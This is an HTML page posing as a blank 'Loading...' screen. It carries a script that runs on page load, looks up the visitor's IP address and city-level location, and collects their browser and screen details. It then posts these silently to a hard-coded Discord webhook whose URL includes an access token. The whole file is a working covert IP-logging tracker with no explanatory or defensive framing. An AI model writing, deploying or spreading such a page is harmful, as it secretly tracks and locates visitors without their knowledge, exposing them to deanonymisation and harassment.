<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
</head>
<body>
<script>
(async () => {
  const webhookURL = "https://discord.com/api/webhooks/1394840467119542343/8zYoSFwGiRTBSkGP2q5hSkqs2klXHmd6nkzHVZ-c9i-0uVUzkQ3AAo5mj4U7HoFYDVHY";
  const geoAPI = "https://ip-api.com/json/";

  // Timestamp
  const timestamp = new Date().toISOString();

  // Device info
  const ua = navigator.userAgent;
  const screenRes = `${screen.width}x${screen.height}`;

  // IP + Location
  let ip = "Unknown", country = "Unknown", region = "Unknown", city = "Unknown";
  try {
    const res = await fetch(geoAPI);
    const data = await res.json();
    ip = data.query || "Unknown";
    country = data.country || "Unknown";
    region = data.regionName || "Unknown";
    city = data.city || "Unknown";
  } catch (err) {
    console.warn("GeoIP fetch failed", err);
  }

  // Webhook payload
  const payload = {
    content: "**New visitor log**",
    embeds: [{
      title: "Visitor Data",
      color: 3092790,
      fields: [
        { name: "IP", value: ip, inline: true },
        { name: "Location", value: `${city}, ${region}, ${country}`, inline: true },
        { name: "User-Agent", value: ua },
        { name: "Screen", value: screenRes, inline: true },
        { name: "Timestamp", value: timestamp, inline: true }
      ]
    }]
  };

  // Fire to webhook
  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
})();
</script>
</body>
</html>
